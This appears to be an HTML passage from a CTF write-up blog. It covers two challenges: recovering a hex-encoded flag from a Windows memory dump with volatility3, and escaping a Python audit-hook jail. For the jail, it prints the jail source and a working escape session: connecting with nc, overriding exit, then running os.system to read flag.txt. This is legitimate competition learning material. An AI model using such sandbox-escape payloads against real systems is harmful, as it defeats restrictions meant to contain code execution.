+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M172.5 131.1C228.1 75.51 320.5 75.51 376.1 131.1C426.1 181.1 433.5 260.8 392.4 318.3L391.3 319.9C381 334.2 361 337.6 346.7 327.3C332.3 317 328.9 297 339.2 282.7L340.3 281.1C363.2 249 359.6 205.1 331.7 177.2C300.3 145.8 249.2 145.8 217.7 177.2L105.5 289.5C73.99 320.1 73.99 372 105.5 403.5C133.3 431.4 177.3 435 209.3 412.1L210.9 410.1C225.3 400.7 245.3 404 255.5 418.4C265.8 432.8 262.5 452.8 248.1 463.1L246.5 464.2C188.1 505.3 110.2 498.7 60.21 448.8C3.741 392.3 3.741 300.7 60.21 244.3L172.5 131.1zM467.5 380C411 436.5 319.5 436.5 263 380C213 330 206.5 251.2 247.6 193.7L248.7 192.1C258.1 177.8 278.1 174.4 293.3 184.7C307.7 194.1 311.1 214.1 300.8 229.3L299.7 230.9C276.8 262.1 280.4 306.9 308.3 334.8C339.7 366.2 390.8 366.2 422.3 334.8L534.5 222.5C566 191 566 139.1 534.5 108.5C506.7 80.63 462.7 76.99 430.7 99.9L429.1 101C414.7 111.3 394.7 107.1 384.5 93.58C374.2 79.2 377.5 59.21 391.9 48.94L393.5 47.82C451 6.731 529.8 13.25 579.8 63.24C636.3 119.7 636.3 211.3 579.8 267.7L467.5 380z"/></svg>
+
+
+ </a>
+  
+</h3>
+<p>We get a <code>.mem</code> file, using volatily3 we dumpe the processes and we see that there is a string in hexadecimal, we decode it and get the flag.</p>
+<pre tabindex="0"><code>$ python vol.py -f ../q4/memdump.mem windows.cmdline
+
+7456    smartscreen.ex  C:\Windows\System32\smartscreen.exe -Embedding
+6448    q4_mal.exe      &#34;C:\Users\user01\Desktop\q4_mal.exe&#34;
+6452    conhost.exe     ??\C:\Windows\system32\conhost.exe 0x4
+4812    71347B616C676F  &#34;C:\Users\user01\Documents\71347B616C676F5F616E616C317331735F703472345F656C5F6D656D64756D707D.exe&#34;
+
+8136    SearchProtocol  &#34;C:\Windows\system32\SearchProtocolHost.exe&#34; Global\UsGthrFltPipeMssGthrPipe4_ Global\UsGthrCtrlFltPipeMssGthrPipe4 1 -2147483646 &#34;Software\Microsoft\Windows Search&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)&#34; &#34;C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc&#34; &#34;DownLevelDaemon&#34;
+5608    SearchFilterHo  &#34;C:\Windows\system32\SearchFilterHost.exe&#34; 0 828 832 840 8192 836 820
+</code></pre><pre tabindex="0"><code>&gt;&gt;&gt; bytes.fromhex(&#34;71347B616C676F5F616E616C317331735F703472345F656C5F6D656D64756D707D&#34;)
+b&#39;q4{algo_anal1s1s_p4r4_el_memdump}&#39;
+</code></pre>
+<h2 id="jail">
+  jail
+  
+  <a hidden class="anchor" href="#jail">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M172.5 131.1C228.1 75.51 320.5 75.51 376.1 131.1C426.1 181.1 433.5 260.8 392.4 318.3L391.3 319.9C381 334.2 361 337.6 346.7 327.3C332.3 317 328.9 297 339.2 282.7L340.3 281.1C363.2 249 359.6 205.1 331.7 177.2C300.3 145.8 249.2 145.8 217.7 177.2L105.5 289.5C73.99 320.1 73.99 372 105.5 403.5C133.3 431.4 177.3 435 209.3 412.1L210.9 410.1C225.3 400.7 245.3 404 255.5 418.4C265.8 432.8 262.5 452.8 248.1 463.1L246.5 464.2C188.1 505.3 110.2 498.7 60.21 448.8C3.741 392.3 3.741 300.7 60.21 244.3L172.5 131.1zM467.5 380C411 436.5 319.5 436.5 263 380C213 330 206.5 251.2 247.6 193.7L248.7 192.1C258.1 177.8 278.1 174.4 293.3 184.7C307.7 194.1 311.1 214.1 300.8 229.3L299.7 230.9C276.8 262.1 280.4 306.9 308.3 334.8C339.7 366.2 390.8 366.2 422.3 334.8L534.5 222.5C566 191 566 139.1 534.5 108.5C506.7 80.63 462.7 76.99 430.7 99.9L429.1 101C414.7 111.3 394.7 107.1 384.5 93.58C374.2 79.2 377.5 59.21 391.9 48.94L393.5 47.82C451 6.731 529.8 13.25 579.8 63.24C636.3 119.7 636.3 211.3 579.8 267.7L467.5 380z"/></svg>
+
+
+ </a>
+  
+</h2>
+
+<h3 id="la-cana">
+  La Cana
+  
+  <a hidden class="anchor" href="#la-cana">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M172.5 131.1C228.1 75.51 320.5 75.51 376.1 131.1C426.1 181.1 433.5 260.8 392.4 318.3L391.3 319.9C381 334.2 361 337.6 346.7 327.3C332.3 317 328.9 297 339.2 282.7L340.3 281.1C363.2 249 359.6 205.1 331.7 177.2C300.3 145.8 249.2 145.8 217.7 177.2L105.5 289.5C73.99 320.1 73.99 372 105.5 403.5C133.3 431.4 177.3 435 209.3 412.1L210.9 410.1C225.3 400.7 245.3 404 255.5 418.4C265.8 432.8 262.5 452.8 248.1 463.1L246.5 464.2C188.1 505.3 110.2 498.7 60.21 448.8C3.741 392.3 3.741 300.7 60.21 244.3L172.5 131.1zM467.5 380C411 436.5 319.5 436.5 263 380C213 330 206.5 251.2 247.6 193.7L248.7 192.1C258.1 177.8 278.1 174.4 293.3 184.7C307.7 194.1 311.1 214.1 300.8 229.3L299.7 230.9C276.8 262.1 280.4 306.9 308.3 334.8C339.7 366.2 390.8 366.2 422.3 334.8L534.5 222.5C566 191 566 139.1 534.5 108.5C506.7 80.63 462.7 76.99 430.7 99.9L429.1 101C414.7 111.3 394.7 107.1 384.5 93.58C374.2 79.2 377.5 59.21 391.9 48.94L393.5 47.82C451 6.731 529.8 13.25 579.8 63.24C636.3 119.7 636.3 211.3 579.8 267.7L467.5 380z"/></svg>
+
+
+ </a>
+  
+</h3>
+<p>We must escape from a Python jail, it gives us the source code and the remote instance to connect to.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check</span>(n, a):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> n <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#34;exec&#34;</span>, <span style="color:#e6db74">&#34;compile&#34;</span>, <span style="color:#e6db74">&#34;builtins.input&#34;</span>, <span style="color:#e6db74">&#34;builtins.input/result&#34;</span>]:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;nah! </span><span style="color:#e6db74">{</span>n<span style="color:#e6db74">}</span><span style="color:#e6db74"> y </span><span style="color:#e6db74">{</span>a<span style="color:#e6db74">}</span><span style="color:#e6db74"> prohibidos!&#34;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Chao no mas!&#34;</span>)
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sys<span style="color:#f92672">.</span>addaudithook(check)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        c <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>        exec(c)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Error!&#34;</span>)
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">0</span>)
+</span></span></code></pre></div><p>The source code looked familiar to me since I had solved a similar challenge in ImaginaryCTF some time ago, but the strange thing is that the payload didn&rsquo;t work because the <code>exit()</code> function of Python gave me an error, looking for it I found this <a href="https://spclr.ch/imaginaryctf-round-11-writeup" target="_blank">https://spclr.ch/imaginaryctf-round-11-writeup</a>
+ and I could solve the challenge.</p>
+<pre tabindex="0"><code>nc 0.cloud.chals.io 32199
+&gt; exit=lambda x: x
+&gt; import os
+&gt; os.system(&#34;cat flag.txt&#34;)
+q4{3scape_de_la_carcel_de_la_vibor4}
+nah! os.system y (b&#39;cat flag.txt&#39;,) prohibidos!
+Chao no mas!
+</code></pre><p>In closing, I want to emphasize that the CTF challenges were excellent and I really enjoyed the experience. I am very satisfied with the level of difficulty and the quality of the challenges. I am certainly looking forward to the next Q4 in March.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+      </main>
+      <footer>
+  <div class="copyright">
+    
+  </div>
+  
+  <div class="attribution">
+    Built with <a href="https://gohugo.io" target="_blank">Hugo</a> & <a href="https://github.com/mnjm/kayal" target="_blank">Kayal</a>
+  </div>
+  
+</footer>
+
+    </div>
+  </body>
+</html>
